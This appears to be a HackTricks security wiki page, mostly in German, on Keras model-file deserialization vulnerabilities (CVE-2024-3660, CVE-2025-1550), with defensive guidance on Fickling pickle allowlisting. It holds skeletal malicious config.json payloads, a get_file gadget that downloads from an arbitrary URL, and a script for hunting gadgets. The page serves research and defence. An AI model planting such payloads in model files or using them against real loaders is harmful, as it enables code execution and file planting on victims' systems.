# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Diese Seite fasst praktische exploitation techniques gegen die Keras model deserialization pipeline zusammen, erklärt die internen Details des nativen .keras-Formats und die attack surface und stellt ein Researcher-Toolkit zur Verfügung, um Model File Vulnerabilities (MFVs) und post-fix gadgets zu finden.

## Interna des .keras-Modelformats

Eine .keras-Datei ist ein ZIP-Archiv, das mindestens enthält:
- metadata.json – generische Informationen (z. B. Keras-Version)
- config.json – Modellarchitektur (primary attack surface)
- model.weights.h5 – weights in HDF5

Die config.json steuert die rekursive Deserialisierung: Keras importiert Module, löst Klassen/Funktionen auf und rekonstruiert layers/objects aus von Angreifern kontrollierten Dictionaries.

Beispielausschnitt für ein Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- Modul-Import und Symbolauflösung aus module/class_name Schlüsseln
- Aufruf von from_config(...) oder Konstruktor mit vom Angreifer kontrollierten kwargs
- Rekursion in verschachtelte Objekte (activations, initializers, constraints, etc.)

Historically, this exposed three primitives to an attacker crafting config.json:
- Kontrolle darüber, welche Module importiert werden
- Kontrolle darüber, welche Klassen/Funktionen aufgelöst werden
- Kontrolle über die kwargs, die an Konstruktoren/from_config übergeben werden

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() verwendete python_utils.func_load(...) welches die Angreifer-Bytes base64-dekodiert und marshal.loads() aufruft; Python-Unmarshalling kann Code ausführen.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras setzt standardmäßig safe_mode=True durch. Serialisierte Python-Funktionen in Lambda werden blockiert, sofern ein Benutzer nicht explizit safe_mode=False setzt.

Notes:
- Legacy formats (older HDF5 saves) or older codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders.

## CVE-2025-1550 – Arbitrarer Modulimport in Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn verwendete importlib.import_module() ohne Einschränkungen mit vom Angreifer kontrollierten Modulstrings aus config.json.
- Auswirkung: Beliebiger Import eines installierten Moduls (oder eines vom Angreifer auf sys.path platzierten Moduls). Zur Importzeit ausgeführter Code läuft, anschließend erfolgt die Objekterstellung mit vom Angreifer kontrollierten kwargs.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sicherheitsverbesserungen (Keras ≥ 3.9):
- Module allowlist: Importe auf offizielle Ökosystem-Module beschränkt: keras, keras_hub, keras_cv, keras_nlp
- Standardmäßig Safe Mode: safe_mode=True blockiert das Laden unsicherer, serialisierter Lambda-Funktionen
- Grundlegende Typprüfung: deserialisierte Objekte müssen den erwarteten Typen entsprechen

## Post-fix gadget-Angriffsfläche innerhalb der allowlist

Selbst mit allowlisting und safe mode bleibt unter den erlaubten Keras-callables eine große Angriffsfläche. Zum Beispiel kann keras.utils.get_file beliebige URLs an vom Benutzer auswählbare Orte herunterladen.

Gadget via Lambda, das auf eine erlaubte Funktion verweist (nicht serialisierter Python-Bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Wichtige Einschränkung:
- Lambda.call() prepends the input tensor as the first positional argument when invoking the target callable. Chosen gadgets must tolerate an extra positional arg (or accept *args/**kwargs). Das schränkt ein, welche Funktionen brauchbar sind.

Potential impacts of allowlisted gadgets:
- Arbitrary download/write (path planting, config poisoning)
- Network callbacks/SSRF-like effects depending on environment
- Chaining to code execution if written paths are later imported/executed or added to PYTHONPATH, or if a writable execution-on-write location exists

## Toolkit für Forscher

1) Systematic gadget discovery in allowed modules

Enumeriere potenzielle callables in keras, keras_nlp, keras_cv, keras_hub und priorisiere jene mit Datei-/Netzwerk-/Prozess-/Umgebungs-Seiteneffekten.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Direkter Deserialisierungstest (kein .keras-Archiv nötig)

Speise speziell gestaltete dicts direkt in Keras deserializers ein, um akzeptierte params zu erlernen und Seiteneffekte zu beobachten.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-Version-Tests und Formate

Keras existiert in mehreren Codebasen/Epochen mit unterschiedlichen Schutzmaßnahmen und Formaten:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, zur Löschung vorgesehen)
- tf-keras: separat gepflegt
- Multi-backend Keras 3 (offiziell): führt das native .keras-Format ein

Wiederhole Tests über Codebasen und Formate (.keras vs legacy HDF5), um Regressionen oder fehlende Schutzmaßnahmen aufzudecken.

## Defensive Empfehlungen

- Behandle Modell-Dateien als nicht vertrauenswürdige Eingabe. Lade Modelle nur aus vertrauenswürdigen Quellen.
- Halte Keras auf dem neuesten Stand; verwende Keras ≥ 3.9, um von allowlisting und Typprüfungen zu profitieren.
- Setze safe_mode=False beim Laden von Modellen nicht, es sei denn, du vertraust der Datei vollständig.
- Ziehe in Betracht, die Deserialisierung in einer isolierten, minimal privilegierten Umgebung ohne ausgehenden Netzwerkverkehr und mit eingeschränktem Dateisystemzugriff auszuführen.
- Setze allowlists/Signaturen für Modellquellen durch und führe Integritätsprüfungen durch, wo möglich.

## ML pickle import allowlisting for AI/ML models (Fickling)

Viele AI/ML-Modellformate (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, ältere TensorFlow-Artefakte, etc.) betten Python pickle-Daten ein. Angreifer missbrauchen routinemäßig pickle GLOBAL-Imports und Objektkonstruktoren, um RCE oder einen Modelltausch beim Laden zu erreichen. Blacklist-basierte Scanner übersehen oft neuartige oder nicht gelistete gefährliche Imports.

Eine praktische Fail-Closed-Defense besteht darin, den Python-pickle-Deserializer zu hooken und beim Unpickling nur eine geprüfte Menge harmloser, ML-bezogener Imports zu erlauben. Trail of Bits’ Fickling implementiert diese Richtlinie und liefert eine kuratierte ML-Import-allowlist, erstellt aus tausenden öffentlichen Hugging Face-Pickles.

Sicherheitsmodell für “sichere” Imports (Intuitionen, destilliert aus Forschung und Praxis): importierte Symbole, die von einem pickle verwendet werden, müssen gleichzeitig:
- Keinen Code ausführen oder Ausführung verursachen (keine kompilierten/Quellcode-Objekte, kein Ausführen externer Prozesse, keine Hooks, etc.)
- Keine beliebigen Attribute oder Elemente lesen oder setzen
- Nicht aus der pickle-VM andere Python-Objekte importieren oder Referenzen darauf beschaffen
- Keine sekundären Deserialisierer auslösen (z. B. marshal, verschachteltes pickle), auch nicht indirekt

Aktiviere Ficklings Schutzmechanismen so früh wie möglich beim Prozessstart, damit alle von Frameworks durchgeführten pickle-Ladevorgänge (torch.load, joblib.load, etc.) überprüft werden:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operative Hinweise:
- Du kannst die hooks dort, wo nötig, vorübergehend deaktivieren/wieder aktivieren:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Wenn ein known-good model blockiert ist, erweitere die allowlist für deine Umgebung, nachdem du die Symbole überprüft hast:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling stellt außerdem generische Runtime-Guards bereit, wenn Sie eine feinere Kontrolle bevorzugen:
- fickling.always_check_safety() zur Erzwingung von Überprüfungen für alle pickle.load()
- with fickling.check_safety(): für bereichsweise Durchsetzung
- fickling.load(path) / fickling.is_likely_safe(path) für einmalige Prüfungen

- Bevorzugen Sie nach Möglichkeit nicht-pickle Modellformate (z. B. SafeTensors). Wenn Sie Pickle akzeptieren müssen, führen Sie Loader mit minimalen Rechten ohne Netzwerk‑Egress aus und setzen Sie die allowlist durch.

Diese allowlist-first-Strategie blockiert nachweislich gängige ML-pickle-Exploit-Pfade und bewahrt gleichzeitig hohe Kompatibilität. In ToB’s Benchmark markierte Fickling 100% der synthetischen bösartigen Dateien und erlaubte ~99% der sauberen Dateien aus den Top Hugging Face repos.

## Referenzen

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
